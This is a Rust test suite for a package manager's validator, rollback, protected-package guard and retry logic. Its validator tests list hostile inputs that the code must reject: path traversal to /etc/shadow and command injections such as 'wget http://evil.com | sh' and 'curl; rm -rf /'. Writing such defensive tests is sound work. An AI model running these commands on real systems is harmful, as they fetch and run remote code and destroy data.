// tests/security_and_resiliency_tests.rs

use linix::app::sync::guard::{GuardScope, Reaped};
use linix::app::sync::planner::{ChangePlanner, HostBackends, PlanScope};
use linix::core::executor::DryRunOutput;
use linix::core::{Error, GraphAction, Transaction, TransactionConfig, Validator};
use std::collections::HashMap;

mod mock_providers;
use mock_providers::{create_dummy_spec, TestKernel};

// ============================================================================
// SECURITY VALIDATION TESTS (Validator Layer)
// ============================================================================

#[test]
fn test_validator_blocks_path_traversal_attempts() {
    let dangerous_names = vec![
        "../../etc/shadow",
        "..\\..\\windows\\system32",
        "pkg/../../tmp/evil",
        "../secret.txt",
        "/etc/passwd",
    ];

    for name in dangerous_names {
        let res = Validator::validate_package_name(name);
        assert!(
            res.is_err(),
            "Security Failure: Validator allowed traversal in: {}",
            name
        );
        if let Err(Error::Validation(msg)) = res {
            assert!(
                msg.contains("Path traversal") || msg.contains("Invalid characters"),
                "Error should identify security violation: {}",
                msg
            );
        }
    }
}

#[test]
fn test_validator_blocks_command_injection_syntax() {
    let dangerous_inputs = vec![
        "curl; rm -rf /",
        "wget http://evil.com | sh",
        "$(whoami)",
        "pkgname&sleep 10",
        "pkg`id`",
        "pkg > /dev/sda",
    ];

    for input in dangerous_inputs {
        let res = Validator::validate_package_name(input);
        assert!(
            res.is_err(),
            "Security Failure: Validator allowed injection in name: {}",
            input
        );
    }
}

#[test]
fn test_validator_permits_safe_modern_names() {
    let safe_names = vec![
        "@scoped/package",
        "my-tool_v1.0.5",
        "github.com/linix/manager",
        "google-cloud-sdk",
        "dotnet-runtime-6.0",
    ];

    for name in safe_names {
        assert!(
            Validator::validate_package_name(name).is_ok(),
            "Validator incorrectly blocked legitimate name: {}",
            name
        );
    }
}

// ============================================================================
// RESILIENCY & INTEGRITY TESTS (Planner & Transaction Layer)
// ============================================================================

#[tokio::test]
async fn test_planner_protects_mission_critical_closure() {
    let kernel = TestKernel::new().await;

    {
        let mut state = kernel.state.lock().await;
        state.add("apt", "sudo", None, Default::default(), "test", false);
        state.add(
            "apt",
            "linux-image-generic",
            None,
            Default::default(),
            "test",
            false,
        );
    }

    let desired = HashMap::new();

    let mut config = (*kernel.app.config).clone();
    config.guard.protected_packages.push("sudo".to_string());
    config
        .guard
        .protected_packages
        .push("linux-image-generic".to_string());

    let state_guard = kernel.state.lock().await;
    let planner = ChangePlanner::new(kernel.app.registry.clone(), &state_guard, &config);

    let plan = planner
        .plan(&desired, PlanScope::Whole(HostBackends::default()))
        .await
        .expect("Planning failed");

    for node in plan.graph.node_weights() {
        if let GraphAction::Remove { name, .. } = node {
            assert!(
                name != "sudo",
                "CRITICAL: Planner scheduled protected package 'sudo' for removal!"
            );
            assert!(
                !name.contains("linux-image"),
                "CRITICAL: Planner scheduled protected kernel for removal!"
            );
        }
    }
}

#[tokio::test]
async fn test_transaction_atomic_rollback_fidelity() {
    let kernel = TestKernel::new().await;

    let spec_a = create_dummy_spec("pkg-a", "brew", None);
    let spec_b = create_dummy_spec("pkg-b", "brew", None);

    kernel
        .mock_executor
        .set_response("brew install -- pkg-a", Ok(DryRunOutput::default().into()));
    kernel.mock_executor.set_response(
        "brew install -- pkg-b",
        Err(Error::command_failed("Network Timeout")),
    );
    kernel.mock_executor.set_response(
        "brew uninstall -- pkg-a",
        Ok(DryRunOutput::default().into()),
    );

    let mut graph = petgraph::stable_graph::StableDiGraph::new();
    let a = graph.add_node(GraphAction::Install(spec_a));
    let b = graph.add_node(GraphAction::Install(spec_b));
    graph.add_edge(a, b, ());

    let mut tx = Transaction::with_config(
        graph,
        kernel.app.registry.clone(),
        kernel.app.journal.clone(),
        kernel.app.diagnostics.clone(),
        kernel.app.config.clone(),
        TransactionConfig::default(),
    )
    .guarded_by(Reaped::for_reason(
        GuardScope::Remove,
        "a unit test of the transaction effector, not of the guard",
    ));

    let result = tx.execute().await;

    assert!(
        result.is_err(),
        "Transaction should have reported failure when dependency B failed"
    );

    let calls: Vec<String> = kernel.mock_executor.get_calls().await;

    assert!(calls.iter().any(|c| c.contains("install -- pkg-a")));
    assert!(calls.iter().any(|c| c.contains("install -- pkg-b")));
    assert!(
        calls.iter().any(|c| c.contains("uninstall -- pkg-a")),
        "Integrity Failure: Node A was not reverted after B failed. Log: {:?}",
        calls
    );
}

// ============================================================================
// ROLLBACK: A COMPENSATING ACTION IS A REMOVAL PATH (V.64)
// ============================================================================

/// What `brew info --json=v1` says about a formula that is installed at 1.0, and about one
/// that is not installed at all.
const INSTALLED_AT_1_0: &str =
    r#"[{"name":"pkg-a","versions":{"stable":"1.0"},"installed":[{"version":"1.0"}]}]"#;
const ABSENT: &str = "[]";

/// A two-node graph: `first` runs and succeeds, `second` fails, so rollback compensates
/// `first`. Returns every command that reached the machine, and what the transaction said.
async fn rollback_after_failure(
    kernel: &TestKernel,
    first: GraphAction,
    installed_before: Option<&str>,
) -> (Vec<String>, String) {
    if let Some(json) = installed_before {
        let mut answer: std::process::Output = DryRunOutput::default().into();
        answer.stdout = json.as_bytes().to_vec();
        kernel
            .mock_executor
            .set_response("brew info --json=v1 -- pkg-a", Ok(answer));
    }
    kernel.mock_executor.set_response(
        "brew install -- pkg-b",
        Err(Error::command_failed("Network Timeout")),
    );

    let mut graph = petgraph::stable_graph::StableDiGraph::new();
    let a = graph.add_node(first);
    let b = graph.add_node(GraphAction::Install(create_dummy_spec(
        "pkg-b", "brew", None,
    )));
    graph.add_edge(a, b, ());

    let mut tx = Transaction::with_config(
        graph,
        kernel.app.registry.clone(),
        kernel.app.journal.clone(),
        kernel.app.diagnostics.clone(),
        kernel.app.config.clone(),
        TransactionConfig::default(),
    )
    .guarded_by(Reaped::for_reason(
        GuardScope::Remove,
        "a unit test of the transaction effector, not of the guard",
    ));
    let err = tx
        .execute()
        .await
        .expect_err("the transaction must report the failure")
        .to_string();
    (kernel.mock_executor.get_calls().await, err)
}

/// The finding: a `@version=` change schedules an `Install` node for a package that is
/// already there, and rollback compensated every `Install` with a removal — so a failed
/// upgrade uninstalled the package instead of reverting it.
#[tokio::test]
async fn a_failed_upgrade_is_reverted_and_never_uninstalled() {
    let kernel = TestKernel::new().await;
    let (calls, _err) = rollback_after_failure(
        &kernel,
        GraphAction::Install(create_dummy_spec("pkg-a", "brew", None)),
        Some(INSTALLED_AT_1_0),
    )
    .await;

    assert!(
        !calls.iter().any(|c| c.contains("uninstall -- pkg-a")),
        "rollback uninstalled a package the user already had: {:?}",
        calls
    );
    assert!(
        calls.iter().any(|c| c.contains("install -- pkg-a@1.0")),
        "rollback did not put pkg-a back at the version it was on: {:?}",
        calls
    );
}

/// A rolled-back removal used to come back with `options: HashMap::new()` — so the package
/// returned at whatever is newest, and the pin the user declared was silently gone.
#[tokio::test]
async fn a_rolled_back_removal_comes_back_at_the_version_it_left_at() {
    let kernel = TestKernel::new().await;
    let (calls, _err) = rollback_after_failure(
        &kernel,
        GraphAction::Remove {
            name: "pkg-a".into(),
            backend: "brew".into(),
        },
        Some(INSTALLED_AT_1_0),
    )
    .await;

    assert!(
        calls.iter().any(|c| c.contains("uninstall -- pkg-a")),
        "the removal node never ran: {:?}",
        calls
    );
    assert!(
        calls.iter().any(|c| c.contains("install -- pkg-a@1.0")),
        "the reinstall lost the version: {:?}",
        calls
    );
}

/// `transaction.rs` had zero references to the guard: rollback's removals were issued at
/// execution time and never passed the plan-time gate, so `protected_packages` did not
/// apply to them. A guard on one path is a guard on nothing.
#[tokio::test]
async fn rollback_will_not_remove_a_protected_package() {
    let mut kernel = TestKernel::new().await;
    let mut config = (*kernel.app.config).clone();
    config.guard.protected_packages.push("pkg-a".to_string());
    kernel.app.config = std::sync::Arc::new(config);

    let (calls, err) = rollback_after_failure(
        &kernel,
        GraphAction::Install(create_dummy_spec("pkg-a", "brew", None)),
        Some(ABSENT), // the case where rollback WOULD remove
    )
    .await;

    assert!(
        !calls.iter().any(|c| c.contains("uninstall -- pkg-a")),
        "a protected package was removed by a rollback: {:?}",
        calls
    );
    let _ = err;
}

/// "I could not ask the manager" is not "the package was not installed". Read as absence, a
/// rollback deletes software this run never installed.
#[tokio::test]
async fn an_unreadable_prior_state_is_never_taken_for_absence() {
    let kernel = TestKernel::new().await;
    kernel.mock_executor.set_response(
        "brew info --json=v1 -- pkg-a",
        Err(Error::command_failed("brew is wedged")),
    );
    let (calls, _err) = rollback_after_failure(
        &kernel,
        GraphAction::Install(create_dummy_spec("pkg-a", "brew", None)),
        None,
    )
    .await;

    assert!(
        !calls.iter().any(|c| c.contains("uninstall -- pkg-a")),
        "rollback removed a package whose prior state it could not read: {:?}",
        calls
    );
}

/// A package that really was absent is still removed — the fix must not turn rollback off.
#[tokio::test]
async fn a_package_this_run_installed_is_still_removed() {
    let kernel = TestKernel::new().await;
    let (calls, _err) = rollback_after_failure(
        &kernel,
        GraphAction::Install(create_dummy_spec("pkg-a", "brew", None)),
        Some(ABSENT),
    )
    .await;

    assert!(
        calls.iter().any(|c| c.contains("uninstall -- pkg-a")),
        "rollback left behind a package this run installed: {:?}",
        calls
    );
}

/// The chain that made all of the above reachable from an ordinary sync: with `info()`
/// failing open, every managed package was scheduled as an Install, each succeeded trivially
/// and landed in the history, and one later failure rolled back across the whole set.
#[tokio::test]
async fn a_manager_that_cannot_answer_stops_the_plan_rather_than_installing_everything() {
    let kernel = TestKernel::new().await;
    kernel.mock_executor.set_response(
        "brew info --json=v1 -- pkg-a",
        Err(Error::command_failed("brew is wedged")),
    );

    let mut desired: HashMap<String, Vec<linix::core::PackageSpec>> = HashMap::new();
    desired.insert(
        "brew".to_string(),
        vec![create_dummy_spec("pkg-a", "brew", None)],
    );

    let state_guard = kernel.state.lock().await;
    let planner = ChangePlanner::new(
        kernel.app.registry.clone(),
        &state_guard,
        &kernel.app.config,
    );
    let err = planner
        .plan(&desired, PlanScope::Whole(HostBackends::default()))
        .await
        .expect_err("a manager that cannot answer must stop the plan")
        .to_string();
    assert!(err.contains("could not say whether"), "{}", err);
}

// ============================================================================
// PARSER & RESOLVER ROBUSTNESS
// ============================================================================

#[tokio::test]
async fn test_resolver_malformed_input_resiliency() {
    let kernel = TestKernel::new().await;
    let resolver = linix::app::sync::resolver::StateResolver::new(
        &kernel.app.config,
        kernel.app.registry.clone(),
        false,
    )
    .await;

    let malformed_inputs = vec![
        "apt:",               // Incomplete identity
        ":curl",              // Missing backend
        "brew@version",       // Option segment with no value
        "@@@@",               // Invalid grammar
        "brew:vim@requires=", // Null requirement set
    ];

    for input in malformed_inputs {
        let res = resolver.parse_and_probe_spec(input).await;
        if let Ok(spec) = res {
            Validator::validate_package_name(&spec.name).ok();
        }
    }
}

// ============================================================================
// RETRY IS A DECISION ABOUT THE FAILURE, NOT A COUNT (§7)
// ============================================================================

/// Backoff long enough to be visible would make these tests sleep; the count is what is
/// under test, not the delay.
fn impatient() -> TransactionConfig {
    TransactionConfig {
        initial_backoff: std::time::Duration::from_millis(1),
        max_backoff: std::time::Duration::from_millis(2),
        auto_rollback: false,
        ..TransactionConfig::patient()
    }
}

/// How many times a single-node transaction actually asked the manager to install.
async fn attempts_for(
    kernel: &TestKernel,
    answer: linix::core::Result<std::process::Output>,
) -> usize {
    kernel
        .mock_executor
        .set_response("brew install -- pkg-a", answer);

    let mut graph = petgraph::stable_graph::StableDiGraph::new();
    graph.add_node(GraphAction::Install(create_dummy_spec(
        "pkg-a", "brew", None,
    )));

    let mut tx = Transaction::with_config(
        graph,
        kernel.app.registry.clone(),
        kernel.app.journal.clone(),
        kernel.app.diagnostics.clone(),
        kernel.app.config.clone(),
        impatient(),
    )
    // `LX-2`: a transaction that may remove needs a token the guard minted. This is a unit
    // test of the effector, which the token's own doc lists as a legitimate mint — threading a
    // real Config and BackendRegistry through here would prove nothing about the guard.
    .guarded_by(Reaped::for_reason(
        GuardScope::Remove,
        "a unit test of the transaction effector, not of the guard",
    ));
    let _ = tx.execute().await;

    kernel
        .mock_executor
        .get_calls()
        .await
        .iter()
        .filter(|c| c.contains("install -- pkg-a"))
        .count()
}

/// The finding: install and remove both got `max_retries: 3` with backoff regardless of
/// whether the failure was retryable. A name no repository carries was retried like a held
/// lock, and the report arrived three backoffs late with the manager's lock held throughout.
#[tokio::test]
async fn a_permanent_failure_is_attempted_once() {
    let kernel = TestKernel::new().await;
    let attempts = attempts_for(
        &kernel,
        Err(Error::NoSuchPackage {
            name: "pkg-a".into(),
            message: "no repository carries it".into(),
        }),
    )
    .await;
    assert_eq!(attempts, 1, "a permanent failure must not be retried");
}

/// The other half: nothing about the fix may make a transient failure give up early.
#[tokio::test]
async fn a_transient_failure_is_retried_to_the_limit() {
    let kernel = TestKernel::new().await;
    let attempts = attempts_for(&kernel, Err(Error::RateLimit("try later".into()))).await;
    assert_eq!(
        attempts,
        (impatient().max_retries + 1) as usize,
        "a transient failure must still use every attempt"
    );
}

/// An unclassified failure keeps the behaviour it had before classification existed. A
/// wrong guess in this direction costs time; the other direction costs a working install.
#[tokio::test]
async fn an_unclassified_failure_still_retries() {
    let kernel = TestKernel::new().await;
    let attempts = attempts_for(
        &kernel,
        Err(Error::command_failed("something nobody named")),
    )
    .await;
    assert_eq!(attempts, (impatient().max_retries + 1) as usize);
}

/// End to end through the backend's own `ExitPolicy`: the manager exits non-zero and says
/// why, and the verdict is read off that — not off the error's text at the retry loop.
#[tokio::test]
async fn a_manager_that_says_the_name_is_wrong_is_believed_the_first_time() {
    let kernel = TestKernel::new().await;
    let attempts = attempts_for(
        &kernel,
        Ok(DryRunOutput::faulted(
            "Error: No available formula with the name \"pkg-a\".",
        )),
    )
    .await;
    assert_eq!(attempts, 1, "brew said the formula does not exist");
}

/// The twin: the same exit code, a complaint that says the network was the problem.
#[tokio::test]
async fn a_manager_that_says_the_network_failed_is_retried() {
    let kernel = TestKernel::new().await;
    let attempts = attempts_for(
        &kernel,
        Ok(DryRunOutput::faulted("curl: (28) Operation timed out")),
    )
    .await;
    assert_eq!(attempts, (impatient().max_retries + 1) as usize);
}

/// Removal is the sibling path, and it took the same uniform retry. A protected-package
/// refusal or a name the manager does not know must not loop either.
#[tokio::test]
async fn a_permanent_removal_failure_is_attempted_once() {
    let kernel = TestKernel::new().await;
    kernel.mock_executor.set_response(
        "brew uninstall -- pkg-a",
        Ok(DryRunOutput::faulted(
            "Error: No available formula with the name \"pkg-a\".",
        )),
    );

    let mut graph = petgraph::stable_graph::StableDiGraph::new();
    graph.add_node(GraphAction::Remove {
        name: "pkg-a".into(),
        backend: "brew".into(),
    });

    let mut tx = Transaction::with_config(
        graph,
        kernel.app.registry.clone(),
        kernel.app.journal.clone(),
        kernel.app.diagnostics.clone(),
        kernel.app.config.clone(),
        impatient(),
    )
    // `LX-2`: a transaction that may remove needs a token the guard minted. This is a unit
    // test of the effector, which the token's own doc lists as a legitimate mint — threading a
    // real Config and BackendRegistry through here would prove nothing about the guard.
    .guarded_by(Reaped::for_reason(
        GuardScope::Remove,
        "a unit test of the transaction effector, not of the guard",
    ));
    let _ = tx.execute().await;

    let attempts = kernel
        .mock_executor
        .get_calls()
        .await
        .iter()
        .filter(|c| c.contains("uninstall -- pkg-a"))
        .count();
    assert_eq!(
        attempts, 1,
        "a permanent removal failure must not be retried"
    );
}
